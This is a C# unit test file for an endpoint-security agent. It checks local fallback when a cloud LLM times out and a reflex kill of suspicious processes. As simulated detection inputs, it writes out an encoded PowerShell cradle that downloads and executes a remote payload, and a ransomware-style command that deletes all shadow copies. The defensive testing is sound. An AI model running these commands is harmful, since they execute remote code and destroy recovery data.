using System.Net.Http;
using System.Text;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Cockpit.ViewModels;
using Phalanx.Shared.Protos;
using Xunit;

namespace Phalanx.Agent.Tests;

[Trait("Category", "Unit")]
public class InvestigationEngineFallbackTests
{
    private class FaultyHttpMessageHandler : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            throw new HttpRequestException("Cloud API connection timeout (50s simulation)");
        }
    }

    private static (ProcessTreeProjectionManager tree, AutonomousHunterAgent agent, ProcessNodeModel targetNode) SetupTestEnvironment(HttpClient? client = null, string? apiKey = "")
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool(),
            new RegistryInspectionTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: apiKey, httpClient: client);

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 1000,
                ParentProcessId = 0,
                ImageName = "explorer.exe",
                CommandLine = "explorer.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 2000,
            ParentProcessId = 1000,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(2000)!;
        return (treeManager, agent, targetNode);
    }

    [Fact]
    public async Task OfflineInvestigation_WithoutFallback_EngineIsOfflineLocal()
    {
        var (_, agent, targetNode) = SetupTestEnvironment(apiKey: string.Empty);

        var result = await agent.InvestigateAsync(targetNode, async _ => { });

        Assert.Equal("OFFLINE_LOCAL", result.InvestigationEngine);
        Assert.Null(result.FallbackReason);
        Assert.Equal("OFFLINE_LOCAL", result.Record.InvestigationEngine);
        Assert.Null(result.Record.FallbackReason);
    }

    [Fact]
    public async Task FallbackInvestigation_WhenGeminiFails_EngineIsOfflineFallbackWithReason()
    {
        var faultyClient = new HttpClient(new FaultyHttpMessageHandler());
        var (_, agent, targetNode) = SetupTestEnvironment(client: faultyClient, apiKey: "simulated-valid-key");

        var result = await agent.InvestigateAsync(targetNode, async _ => { });

        Assert.Equal("OFFLINE_FALLBACK", result.InvestigationEngine);
        Assert.NotNull(result.FallbackReason);
        Assert.Contains("Cloud API connection timeout", result.FallbackReason);
        Assert.Equal("OFFLINE_FALLBACK", result.Record.InvestigationEngine);
        Assert.Contains("Cloud API connection timeout", result.Record.FallbackReason);
    }

    [Fact]
    public void KernelReflex_RansomwareCommand_EngineIsKernelReflex()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, Array.Empty<IInvestigationTool>(), geminiApiKey: string.Empty);

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent { ProcessId = 100, ParentProcessId = 0, ImageName = "System", CommandLine = "System" }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 3000,
            ParentProcessId = 100,
            ImageName = "vssadmin.exe",
            CommandLine = "vssadmin.exe delete shadows /all /quiet",
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(3000)!;
        var result = agent.HandleReflexKill(targetNode);

        Assert.Equal("KERNEL_REFLEX", result.InvestigationEngine);
        Assert.Equal("KERNEL_REFLEX", result.Record.InvestigationEngine);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
    }

    [Theory]
    [InlineData("OFFLINE_FALLBACK", "LOCAL FALLBACK", true, false, false, false)]
    [InlineData("CLOUD_LLM", "CLOUD LLM", false, true, false, false)]
    [InlineData("OFFLINE_LOCAL", "LOCAL OFFLINE", false, false, true, false)]
    [InlineData("KERNEL_REFLEX", "KERNEL REFLEX", false, false, false, true)]
    public void IncidentItemViewModel_EngineBadgeProperties_MatchInvestigationEngine(
        string engine, string expectedBadge, bool isFallback, bool isCloud, bool isOffline, bool isReflex)
    {
        var vm = new IncidentItemViewModel
        {
            InvestigationEngine = engine,
            FallbackReason = isFallback ? "Simulated API timeout" : null
        };

        Assert.Equal(expectedBadge, vm.EngineBadgeText);
        Assert.Equal(isFallback, vm.IsFallbackEngine);
        Assert.Equal(isCloud, vm.IsCloudEngine);
        Assert.Equal(isOffline, vm.IsOfflineEngine);
        Assert.Equal(isReflex, vm.IsKernelReflexEngine);

        if (isFallback)
        {
            Assert.Contains("로컬 엔진 폴백됨", vm.EngineBadgeTooltip);
            Assert.Contains("Simulated API timeout", vm.EngineBadgeTooltip);
        }
    }
}
